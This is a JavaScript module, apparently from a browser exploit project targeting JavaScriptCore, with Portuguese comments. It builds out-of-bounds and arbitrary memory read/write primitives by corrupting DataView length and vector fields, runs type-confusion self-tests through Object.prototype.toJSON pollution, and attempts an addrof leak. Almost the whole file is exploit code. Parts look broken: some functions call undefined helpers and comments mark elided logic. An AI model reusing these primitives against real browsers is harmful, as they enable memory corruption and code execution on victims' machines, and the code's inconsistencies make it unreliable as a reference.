// js/core_exploit.mjs (v31.1 - Ordem de isOOBReady e chamada corrigida)

import { AdvancedInt64, isAdvancedInt64Object, PAUSE, toHex } from './utils.mjs';
import { logS3 as log } from './script3/s3_utils.mjs';
import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';

export let oob_array_buffer_real = null;
export let oob_dataview_real = null;
let isOOBEnvironmentSetup = false;

const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58;
const OOB_DV_M_VECTOR_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
const OOB_DV_M_LENGTH_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
const OOB_DV_M_MODE_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;

export function clearOOBEnvironment(options = { force_clear_even_if_not_setup: false }) {
    oob_array_buffer_real = null; oob_dataview_real = null; isOOBEnvironmentSetup = false;
}
export function getOOBAllocationSize() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") updateOOBConfigFromUI(document);
    return OOB_CONFIG.ALLOCATION_SIZE;
}
// getBaseOffsetInDV, getInitialBufferSize ... 
export function getBaseOffsetInDV() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") updateOOBConfigFromUI(document);
    return OOB_CONFIG.BASE_OFFSET_IN_DV;
}
export function getInitialBufferSize() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") updateOOBConfigFromUI(document);
    return OOB_CONFIG.INITIAL_BUFFER_SIZE;
}

// isOOBReady DEFINIDA ANTES DE SER USADA POR ARB_READ/ARB_WRITE
export function isOOBReady() { 
    let mLE = false; 
    try { 
        if (isOOBEnvironmentSetup && oob_dataview_real && oob_array_buffer_real && 
            oob_array_buffer_real.byteLength > OOB_DV_M_LENGTH_OFFSET + 3) {
            mLE = (oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET, true) === 0xFFFFFFFF);
        }
    } catch (e) { mLE = false; }
    return isOOBEnvironmentSetup && 
           oob_array_buffer_real instanceof ArrayBuffer &&
           oob_dataview_real instanceof DataView &&
           oob_array_buffer_real.byteLength > 0 &&
           oob_dataview_real.buffer === oob_array_buffer_real && 
           mLE;
}

export async function triggerOOB_primitive(options = { force_reinit: false }) {
    const FNAME_TRIGGER = 'CoreExploit.triggerOOB_primitive';
    if (isOOBReady() && !options.force_reinit) { // Usa a isOOBReady já definida
        return true;
    }
    // Se chegou aqui, ou é force_reinit ou o ambiente não estava pronto/consistente.
    if(isOOBEnvironmentSetup && !options.force_reinit){ // Se estava setup mas não "Ready"
         log(`Ambiente OOB marcado como configurado, mas inconsistente/não expandido. Forçando re-inicialização.`, 'warn', FNAME_TRIGGER);
    }
    clearOOBEnvironment({ force_clear_even_if_not_setup: true }); // Limpa antes de (re)criar

    const currentAllocSize = getOOBAllocationSize(); 
    try {
        oob_array_buffer_real = new ArrayBuffer(currentAllocSize);
        oob_dataview_real = new DataView(oob_array_buffer_real, 0, currentAllocSize);
        if (currentAllocSize > OOB_DV_M_LENGTH_OFFSET + 3) {
            oob_dataview_real.setUint32(OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, true);
            log(`    m_length expandido para 0xFFFFFFFF no core_exploit.`, 'info', FNAME_TRIGGER);
        } else { throw new Error("Falha ao expandir m_length no core_exploit."); }
        isOOBEnvironmentSetup = true; 
        log(`Ambiente OOB CONFIGURADO no core_exploit.`, 'good', FNAME_TRIGGER); 
        return true;
    } catch (e) { 
        log(`ERRO triggerOOB no core_exploit: ${e.message}`, 'critical', FNAME_TRIGGER); 
        clearOOBEnvironment({ force_clear_even_if_not_setup: true }); 
        throw e; 
    }
}

export function oob_read_absolute(offset, byteLength) { 
    if (!isOOBReady()) throw new Error("OOB não pronto para oob_read_absolute no core_exploit.");
    if (offset < 0 || (offset + byteLength) > oob_array_buffer_real.byteLength) throw new RangeError("oob_read_absolute fora dos limites no core_exploit.");
    switch (byteLength) { /* ... lógica interna ... */ 
        case 1: return oob_dataview_real.getUint8(offset);
        case 2: return oob_dataview_real.getUint16(offset, true);
        case 4: return oob_dataview_real.getUint32(offset, true);
        case 8: return new AdvancedInt64(oob_dataview_real.getUint32(offset, true), oob_dataview_real.getUint32(offset + 4, true));
        default: throw new Error("Invalid byteLength no core_exploit");
    }
}
export function oob_write_absolute(offset, value, byteLength) {
    if (!isOOBReady()) throw new Error("OOB não pronto para oob_write_absolute no core_exploit.");
    if (offset < 0 || (offset + byteLength) > oob_array_buffer_real.byteLength) throw new RangeError("oob_write_absolute fora dos limites no core_exploit.");
    let val64;
    switch (byteLength) { /* ... lógica interna ... */
        case 1: oob_dataview_real.setUint8(offset, Number(value)); break;
        case 2: oob_dataview_real.setUint16(offset, Number(value), true); break;
        case 4: oob_dataview_real.setUint32(offset, Number(value), true); break;
        case 8:
            val64 = isAdvancedInt64Object(value) ? value : new AdvancedInt64(value);
            oob_dataview_real.setUint32(offset, val64.low(), true);
            oob_dataview_real.setUint32(offset + 4, val64.high(), true);
            break;
        default: throw new Error("Invalid byteLength no core_exploit");
    }
}

async function _perform_explicit_dv_reset_after_arb_op(fname_parent_for_log) {
    // ... (como na v31) ...
    try { if (isOOBReady()){ const temp_val = oob_read_absolute(0,1); oob_write_absolute(0, temp_val, 1); }
    } catch (e) { logS3(`ERRO no reset explícito do DV: ${e.message}`, 'error', `${fname_parent_for_log}._reset`); }
}

export async function arb_read(absolute_address, byteLength) {
    const FNAME = 'CoreExploit.arb_read (v31.1)';
    if (!isOOBReady()) { // Chama a isOOBReady que agora está definida acima
        await triggerOOB_primitive({force_reinit: true}); 
        if (!isOOBReady()) { throw new Error("Ambiente OOB não pôde ser inicializado para arb_read."); }
    }
    // ... (restante da lógica de arb_read como na v31, com o finally chamando _perform_explicit_dv_reset_after_arb_op)
    let addr64 = isAdvancedInt64Object(absolute_address) ? absolute_address : new AdvancedInt64(absolute_address);
    let mVO, mLO, mMO, res;
    try {
        mVO = oob_read_absolute(OOB_DV_M_VECTOR_OFFSET, 8); mLO = oob_read_absolute(OOB_DV_M_LENGTH_OFFSET, 4); mMO = oob_read_absolute(OOB_DV_M_MODE_OFFSET, 4);
        oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, addr64, 8); oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, 4);
        switch (byteLength) { /* ... */ 
            case 1: res = oob_dataview_real.getUint8(0); break;
            case 2: res = oob_dataview_real.getUint16(0, true); break;
            case 4: res = oob_dataview_real.getUint32(0, true); break;
            case 8: res = new AdvancedInt64(oob_dataview_real.getUint32(0, true), oob_dataview_real.getUint32(4, true)); break;
            default: throw new Error("Invalid byteLength");
        } return res;
    } finally { 
        if (mVO && typeof mLO ==='number' && typeof mMO ==='number' && isOOBReady()) {
            try {
                oob_write_absolute(OOB_DV_M_VECTOR_OFFSET,mVO,8); oob_write_absolute(OOB_DV_M_LENGTH_OFFSET,mLO,4); oob_write_absolute(OOB_DV_M_MODE_OFFSET,mMO,4);
                await _perform_explicit_dv_reset_after_arb_op(FNAME); 
            } catch (eR) { log(`ERRO ${FNAME} restaurando: ${eR.message}`,'critical'); isOOBEnvironmentSetup=false; }
        } else if(isOOBReady()){ log(` ${FNAME} não pôde restaurar.`,'critical'); }
    }
}
export async function arb_write(absolute_address, value, byteLength) {
    const FNAME = 'CoreExploit.arb_write (v31.1)';
    if (!isOOBReady()) { // Chama a isOOBReady que agora está definida acima
        await triggerOOB_primitive({force_reinit: true});
        if (!isOOBReady()) { throw new Error("Ambiente OOB não pôde ser inicializado para arb_write."); }
    }
    // ... (restante da lógica de arb_write como na v31, com o finally chamando _perform_explicit_dv_reset_after_arb_op)
    let addr64 = isAdvancedInt64Object(absolute_address) ? absolute_address : new AdvancedInt64(absolute_address);
    let mVO, mLO, mMO;
    try {
        mVO = oob_read_absolute(OOB_DV_M_VECTOR_OFFSET, 8); mLO = oob_read_absolute(OOB_DV_M_LENGTH_OFFSET, 4); mMO = oob_read_absolute(OOB_DV_M_MODE_OFFSET, 4);
        oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, addr64, 8); oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, 4);
        let val64;
        switch (byteLength) { /* ... */ 
            case 1: oob_dataview_real.setUint8(0, Number(value)); break;
            case 2: oob_dataview_real.setUint16(0, Number(value), true); break;
            case 4: oob_dataview_real.setUint32(0, Number(value), true); break;
            case 8: val64 = isAdvancedInt64Object(value)?value:new AdvancedInt64(value); oob_dataview_real.setUint32(0,val64.low(),true); oob_dataview_real.setUint32(4,val64.high(),true); break;
            default: throw new Error("Invalid byteLength");
        }
    } finally { 
        if (mVO && typeof mLO ==='number' && typeof mMO ==='number' && isOOBReady()) {
            try {
                oob_write_absolute(OOB_DV_M_VECTOR_OFFSET,mVO,8); oob_write_absolute(OOB_DV_M_LENGTH_OFFSET,mLO,4); oob_write_absolute(OOB_DV_M_MODE_OFFSET,mMO,4);
                await _perform_explicit_dv_reset_after_arb_op(FNAME);
            } catch (eR) { log(`ERRO ${FNAME} restaurando: ${eR.message}`,'critical'); isOOBEnvironmentSetup=false; }
        } else if(isOOBReady()){ log(` ${FNAME} não pôde restaurar.`,'critical'); }
    }
}

// =======================================================================================
// SEÇÕES DE TESTE E ADDROF (HEISENBUG) - MANTIDAS DO SEU ARQUIVO ORIGINAL
// Certifique-se de que este código abaixo é IDÊNTICO ao que você tinha no seu arquivo de 918 linhas.
// =======================================================================================

export async function selfTestOOBReadWrite(logFnParam) {
    const currentLog = logFnParam || log;
    const FNAME_TEST = 'CoreExploit.selfTestOOBReadWrite';
    currentLog(`--- Iniciando Auto-Teste de OOB R/W (com re-inicialização forçada) ---`, 'test', FNAME_TEST);
    try {
        await triggerOOB_primitive({ force_reinit: true });
        const test_offset = 0x50;
        const test_val32 = 0x11223344;
        oob_write_absolute(test_offset, test_val32, 4);
        const read_val32 = oob_read_absolute(test_offset, 4);
        if (read_val32 === test_val32) {
            currentLog(`SUCESSO: Lido ${toHexHelper(read_val32)} corretamente (32bit).`, "good", FNAME_TEST);
        } else {
            currentLog(`FALHA: Lido ${toHexHelper(read_val32)}, esperado ${toHexHelper(test_val32)}.`, "error", FNAME_TEST); throw new Error("Self-test 32bit failed");
        }
        const next_offset = test_offset + 8;
        const test_val64 = new AdvancedInt64(0xAABBCCDD, 0xEEFF0011);
        oob_write_absolute(next_offset, test_val64, 8);
        const read_val64 = oob_read_absolute(next_offset, 8);
        if (isAdvancedInt64Object(read_val64) && read_val64.equals(test_val64)) {
            currentLog(`SUCESSO: Lido ${read_val64.toString(true)} corretamente (64bit).`, "good", FNAME_TEST);
        } else {
            currentLog(`FALHA: Lido ${isAdvancedInt64Object(read_val64) ? read_val64.toString(true) : String(read_val64)}, esperado ${test_val64.toString(true)}.`, "error", FNAME_TEST); throw new Error("Self-test 64bit failed");
        }
        currentLog(`--- Auto-Teste de OOB R/W Concluído ---`, 'test', FNAME_TEST);
        return true;
    } catch (e) {
        currentLog(`ERRO no Auto-Teste OOB R/W: ${e.message}`, 'critical', FNAME_TEST);
        return false;
    }
}

const HEISENBUG_OOB_DATAVIEW_METADATA_BASE = OOB_DV_METADATA_BASE_IN_OOB_BUFFER;
const HEISENBUG_OOB_DATAVIEW_MLENGTH_OFFSET = JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; 
const HEISENBUG_CRITICAL_WRITE_OFFSET = HEISENBUG_OOB_DATAVIEW_METADATA_BASE + HEISENBUG_OOB_DATAVIEW_MLENGTH_OFFSET;
const HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF;
const HEISENBUG_VICTIM_AB_SIZE = 64;

export async function selfTestTypeConfusionAndMemoryControl(logFnParam) {
    const currentLog = logFnParam || log;  
    const FNAME_TEST = 'CoreExploit.selfTestTypeConfusionAndMemoryControl';
    currentLog(`--- Iniciando Auto-Teste Combinado: Type Confusion e Controle de Memória para Addrof ---`, 'test', FNAME_TEST);

    let originalToJSONDescriptor = null;
    let pollutionApplied = false;
    let local_probe_details_for_selftest = null; 
    let overallSuccess = true;

    try {
        currentLog(`FASE 1: Testando Type Confusion (usando constantes HEISENBUG_*)...`, 'subtest', FNAME_TEST);
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("Falha ao inicializar ambiente OOB para teste de Type Confusion.");
        }
        currentLog(`    (TC SelfTest) Alvo da corrupção OOB: ${toHexHelper(HEISENBUG_CRITICAL_WRITE_OFFSET)}`, 'info', FNAME_TEST);
        oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET, HEISENBUG_CRITICAL_WRITE_VALUE, 4);
        currentLog(`        (TC SelfTest) Escrita OOB crítica realizada.`, "info", FNAME_TEST);
        await PAUSE(100);

        let victim_ab_for_selftest = new ArrayBuffer(HEISENBUG_VICTIM_AB_SIZE); 
        currentLog(`    (TC SelfTest) victim_ab_for_selftest (tamanho ${HEISENBUG_VICTIM_AB_SIZE} bytes) criado.`, "info", FNAME_TEST);

        const toJSON_ProbeForSelfTest = function() { 
            local_probe_details_for_selftest = { 
                this_type_in_toJSON: Object.prototype.toString.call(this),
                is_victim: (this === victim_ab_for_selftest)
            };
            return { self_test_probe_executed_tc: true }; 
        };

        const ppKey_TC = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_TC);
        Object.defineProperty(Object.prototype, ppKey_TC, {
            value: toJSON_ProbeForSelfTest,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        currentLog(`        (TC SelfTest) Object.prototype.${ppKey_TC} poluído com sonda.`, "info", FNAME_TEST);
        
        let stringifyOutput_TC = JSON.stringify(victim_ab_for_selftest);
        currentLog(`        (TC SelfTest) JSON.stringify completou. Retorno da sonda: "${stringifyOutput_TC}"`, "info", FNAME_TEST); 
        currentLog(`        (TC SelfTest) Detalhes da sonda: ${local_probe_details_for_selftest ? JSON.stringify(local_probe_details_for_selftest) : 'N/A'}`, "leak", FNAME_TEST);

        if (local_probe_details_for_selftest && local_probe_details_for_selftest.is_victim && local_probe_details_for_selftest.this_type_in_toJSON === "[object Object]") {
            currentLog(`    (TC SelfTest) SUCESSO: Confusão de tipo detectada! 'this' é [object Object].`, "vuln", FNAME_TEST);
        } else {
            let detailsMsg = local_probe_details_for_selftest ? `is_victim=${local_probe_details_for_selftest.is_victim}, type=${local_probe_details_for_selftest.this_type_in_toJSON}` : "sonda não forneceu detalhes";
            currentLog(`    (TC SelfTest) FALHA: Teste de Type Confusion. Detalhes: ${detailsMsg}. Esperado [object Object].`, "error", FNAME_TEST);
            overallSuccess = false;
        }
    } catch (e) {
        currentLog(`ERRO na FASE 1 (Type Confusion - SelfTest): ${e.message}${e.stack ? '\n' + e.stack : ''}`, 'critical', FNAME_TEST);
        overallSuccess = false;
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, 'toJSON', originalToJSONDescriptor);
            else delete Object.prototype['toJSON'];
            currentLog(`        (TC SelfTest) Object.prototype.toJSON restaurado.`, "info", FNAME_TEST);
            pollutionApplied = false;
            originalToJSONDescriptor = null;
        }
    }

    if (!overallSuccess && FNAME_TEST.includes("selfTestTypeConfusionAndMemoryControl")) { 
        currentLog(`Teste de Type Confusion (SelfTest) falhou. Abortando teste de Controle de Memória.`, 'warn', FNAME_TEST);
    } else if (overallSuccess) { 
        await PAUSE(200);
        currentLog(`FASE 2: Testando Controle de Memória...`, 'subtest', FNAME_TEST);
        try {
            if (!isOOBReady()) {
                await triggerOOB_primitive({ force_reinit: true });
                if (!isOOBReady()) throw new Error("Falha ao (re)inicializar ambiente OOB para teste de Controle de Memória.");
            }
            const OFFSET_M_VECTOR_TARGET = OOB_DV_M_VECTOR_OFFSET; 
            const OFFSET_M_LENGTH_TARGET = OOB_DV_M_LENGTH_OFFSET;
            const OFFSET_M_MODE_TARGET   = OOB_DV_M_MODE_OFFSET;
            
            const PLANT_M_VECTOR = new AdvancedInt64(0xAABBCCDD, 0x11223344); 
            const PLANT_M_LENGTH = 0xFFFFFFFF; 
            const PLANT_M_MODE   = 0xFFFFFFFF; 
            
            currentLog(`    (MC) Configurando estrutura...`, 'info', FNAME_TEST);
            currentLog(`        m_vector (@${toHexHelper(OFFSET_M_VECTOR_TARGET)}) para ${PLANT_M_VECTOR.toString(true)}`, 'info', FNAME_TEST);
            oob_write_absolute(OFFSET_M_VECTOR_TARGET, PLANT_M_VECTOR, 8);
            oob_write_absolute(OFFSET_M_LENGTH_TARGET, PLANT_M_LENGTH, 4); // Escrevendo como DWORD
            oob_write_absolute(OFFSET_M_MODE_TARGET, PLANT_M_MODE, 4);   // Escrevendo como DWORD
            currentLog(`        m_length (@${toHexHelper(OFFSET_M_LENGTH_TARGET)}) para ${toHexHelper(PLANT_M_LENGTH)}`, 'info', FNAME_TEST);
            currentLog(`        m_mode (@${toHexHelper(OFFSET_M_MODE_TARGET)}) para ${toHexHelper(PLANT_M_MODE)}`, 'info', FNAME_TEST);

            const read_m_vector = oob_read_absolute(OFFSET_M_VECTOR_TARGET, 8);
            const read_m_length_val = oob_read_absolute(OFFSET_M_LENGTH_TARGET, 4); 
            const read_m_mode_val   = oob_read_absolute(OFFSET_M_MODE_TARGET, 4);  
            
            currentLog(`        Lido m_vector (@${toHexHelper(OFFSET_M_VECTOR_TARGET)}): ${read_m_vector.toString(true)}`, "leak", FNAME_TEST);
            currentLog(`        Lido m_length (@${toHexHelper(OFFSET_M_LENGTH_TARGET)}): ${toHexHelper(read_m_length_val)}`, "leak", FNAME_TEST);
            currentLog(`        Lido m_mode   (@${toHexHelper(OFFSET_M_MODE_TARGET)}): ${toHexHelper(read_m_mode_val)}`, "leak", FNAME_TEST);

            let memoryControlSuccess = true;
            if (!read_m_vector.equals(PLANT_M_VECTOR)) {
                currentLog(`    (MC) AVISO/FALHA: m_vector lido (${read_m_vector.toString(true)}) não corresponde ao plantado (${PLANT_M_VECTOR.toString(true)}).`, "warn", FNAME_TEST);
            }
            if (read_m_length_val !== PLANT_M_LENGTH) {
                currentLog(`    (MC) FALHA: m_length lido (${toHexHelper(read_m_length_val)}) não corresponde ao plantado (${toHexHelper(PLANT_M_LENGTH)}).`, "error", FNAME_TEST);
                memoryControlSuccess = false;
            }
            if (read_m_mode_val !== PLANT_M_MODE) {
                 currentLog(`    (MC) FALHA: m_mode lido (${toHexHelper(read_m_mode_val)}) não corresponde ao plantado (${toHexHelper(PLANT_M_MODE)}).`, "error", FNAME_TEST);
                memoryControlSuccess = false;
            }
            if (memoryControlSuccess) {
                currentLog(`    (MC) SUCESSO (parcial ou total): Controle de m_length e m_mode verificado! (m_vector requer teste funcional).`, "vuln", FNAME_TEST);
            } else {
                currentLog(`    (MC) FALHA: Teste de Controle de Memória (m_length/m_mode).`, "error", FNAME_TEST);
                overallSuccess = false;
            }
        } catch (e) {
            currentLog(`ERRO na FASE 2 (Controle de Memória - SelfTest): ${e.message}${e.stack ? '\n' + e.stack : ''}`, 'critical', FNAME_TEST);
            overallSuccess = false;
        }
    }

    currentLog(`--- Auto-Teste Combinado CONCLUÍDO ${overallSuccess ? 'COM SUCESSO' : 'COM FALHA'} ---`, 'test', FNAME_TEST);
    return overallSuccess;
}

let _targetObjectForAddrofProbe = null; 
let _heisenbugConfirmedByProbe = false; 

function _toJSONProbeForAddrofInCore() {
    let currentThisType = Object.prototype.toString.call(this);
    log(`[CoreAddrofProbe] Tipo de 'this' observado: ${currentThisType}`, "leak", "CoreExploit._toJSONProbeForAddrofInCore");
    if (currentThisType === '[object Object]') { 
        _heisenbugConfirmedByProbe = true;
        if (_targetObjectForAddrofProbe) {
            try { this[0] = _targetObjectForAddrofProbe; } catch (e_write) { /* log erro */ }
        }
    } else { _heisenbugConfirmedByProbe = false; }
    return { core_addrof_probe_executed: true, type_seen: currentThisType };
}

export async function attemptAddrofUsingCoreHeisenbug(targetObject) {
    const FNAME_FUNC = "CoreExploit.attemptAddrofUsingCoreHeisenbug";
    log(`[${FNAME_FUNC}] AVISO: Esta primitiva de addrof é conhecida por falhar no ambiente de teste atual.`, "warn", FNAME_FUNC);
    _targetObjectForAddrofProbe = targetObject; 
    _heisenbugConfirmedByProbe = false;   
    let addrof_result_internal = { success: false, message: "Addrof (Heisenbug) não iniciado." };
    let originalToJSONDescriptorForCoreAddrof = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
    let pollutedByCoreAddrof = false;
    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) { throw new Error("Ambiente OOB não pôde ser inicializado para Addrof."); }
        oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET, HEISENBUG_CRITICAL_WRITE_VALUE, 4);
        await PAUSE(100); 
        let confused_ab_candidate = new ArrayBuffer(HEISENBUG_VICTIM_AB_SIZE);
        let float_view_on_confused_ab = new Float64Array(confused_ab_candidate);
        float_view_on_confused_ab.fill(0.4455667788); 
        Object.defineProperty(Object.prototype, 'toJSON', { value: _toJSONProbeForAddrofInCore, writable: true, configurable: true, enumerable: false });
        pollutedByCoreAddrof = true;
        JSON.stringify(confused_ab_candidate); 
        if (_heisenbugConfirmedByProbe) {
            const val_double = float_view_on_confused_ab[0];
            addrof_result_internal.leaked_address_as_double = val_double;
            const db_conv = new ArrayBuffer(8); (new Float64Array(db_conv))[0] = val_double;
            const dv_conv_i = new Uint32Array(db_conv);
            addrof_result_internal.leaked_address_as_int64 = new AdvancedInt64(dv_conv_i[0], dv_conv_i[1]);
            if (val_double !== 0 && val_double !== 0.4455667788 &&
                (addrof_result_internal.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_internal.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000)) {
                addrof_result_internal.success = true;
                addrof_result_internal.message = "Addrof (Heisenbug) supostamente bem-sucedido.";
            } else { addrof_result_internal.message = "Heisenbug ocorreu, mas valor lido não parece endereço."; }
        } else { addrof_result_internal.message = "Heisenbug não foi confirmada pela sonda."; }
    } catch (e) { addrof_result_internal.message = `Erro crítico em Addrof: ${e.message}`;
    } finally {
        if (pollutedByCoreAddrof) {
            if (originalToJSONDescriptorForCoreAddrof) Object.defineProperty(Object.prototype, 'toJSON', originalToJSONDescriptorForCoreAddrof);
            else delete Object.prototype.toJSON;
        }
        _targetObjectForAddrofProbe = null; 
    }
    return addrof_result_internal;
}
